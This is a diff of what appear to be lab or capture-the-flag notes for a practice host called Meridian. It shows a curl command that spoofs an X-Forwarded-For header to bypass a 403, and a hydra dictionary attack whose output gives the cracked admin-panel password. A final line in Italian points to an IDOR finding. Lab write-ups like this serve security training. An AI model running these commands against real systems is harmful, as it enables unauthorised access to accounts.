@@ -133,4 +133,20 @@ The /hidden-page page on Meridian returns a 403 Forbidden response. What is the 
 curl -H "X-Forwarded-For: 127.0.0.1" http://meridian.hv/hidden-page/
 Artemis  
 
+Crack the password of the black user on Meridian's admin panel using a dictionary attack. What is the account password? (Wordlist: SecLists → Passwords → darkweb2017-top1000.txt)
+
+└─$ hydra -l black -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt meridian.hv http-post-form "/webadmin/login.php:username=^USER^&password=^PASS^:F=Invalid username or password" 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-01 10:55:34
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
+[DATA] attacking http-post-form://meridian.hv:80/webadmin/login.php:username=^USER^&password=^PASS^:F=Invalid username or password
+[80][http-post-form] host: meridian.hv   login: black   password: hunter
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-01 10:55:38
+
+After logging into Meridian's admin panel as the black user, identify the relevant vulnerability and view the admin user's information. What is the admin user's email address?
+
+-> vedere immagine vulnerabilità idor
+
 
